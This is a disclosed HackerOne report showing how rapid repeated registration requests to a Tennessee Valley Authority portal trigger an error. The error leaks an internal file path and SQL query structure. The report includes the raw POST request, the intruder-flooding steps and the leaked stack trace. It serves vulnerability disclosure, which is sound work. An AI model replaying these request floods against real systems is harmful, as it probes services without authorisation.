# internal path disclosure via register error

## Report Details
- **Report ID**: 2213381
- **URL**: https://hackerone.com/reports/2213381
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-10-17T17:20:43.533Z
- **Disclosed**: 2023-11-30T15:45:36.618Z

## Reporter
- **Username**: mohs3n
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: tennessee-valley-authority

## Vulnerability Information
## Summary:
Hi team,
when we call too many register query, we get  error, in this error we can see internal path and sql query structure

## Steps To Reproduce:
1. go to register form https://valleyconnect.tva.gov/registration 
2. complete form and click on submit registration, then intercept request with burp
3. use intruder for call multiple request, we should replace email in every request.

```
POST /registration HTTP/2
Host: valleyconnect.tva.gov

UserName=admin&Password=jgn%25%5EThgf%23rfvHRESdy56tef&ConfirmPassword=jgn%25%5EThgf%23rfvHRESdy56tef&EmailAddress=Z%40jetamooz.com&EmailAddressVerify=Z%40jetamooz.com&FirstName=alex&LastName=jane&Initials=&Suffix=&JobTitle=it&OrganizationType=Business+Partner&OrganizationName=sarv&Country=792&StreetAddress=sary&City=katy&Province=titi&State=AL&ZipCode=&PhoneNumber=%28934%29+734-4364&MobilePhoneNumber=%28957%29+363-4655&TimeZone=America%2FLos_Angeles&CapAnswer=U4YIQ&CapKey=XXTxVOUWZrCz6buVtsgF2cFaPHLSCKVSRQc4z4My13Bee8JiTYVZXmiPd8zLSbMc&BeCheck=
```

response :
```
 Failed to request registration. Please try again or contact support. Error: Telerik.OpenAccess.Exceptions.OptimisticVerificationException: Row not found: GenericOID@b5128f1e RegistrationRequest base_id=1f499ef7-83fa-4a77-8fd9-693b52c4db9b
UPDATE [sf_dynamic_content] SET [last_modified] = @p0, [voa_version] = @p1 WHERE [base_id] = @p2 AND [voa_version] = @p3
Batch Entry 0 (set event logging to all to see parameter data)
   at Telerik.Sitefinity.Data.TransactionManager.CommitTransaction(String transactionName)
   at DataAccessLayer.Classes.RegistrationRequestService.AddRegistrationRequest(RegistrationRequestEntry model) in D:\Agent\_work\1825\s\Code\DataAccessLayer\Classes\RegistrationRequestService.cs:line 193
```

## Tips:
we should insert fast and continuous for geting error

## Supporting Material/References:
{F2781135}
{F2781143}

## Impact

Impact

## Attachments
- Screenshot_from_2023-10-17_20-40-24.png
- Screenshot_from_2023-10-17_20-40-27.png
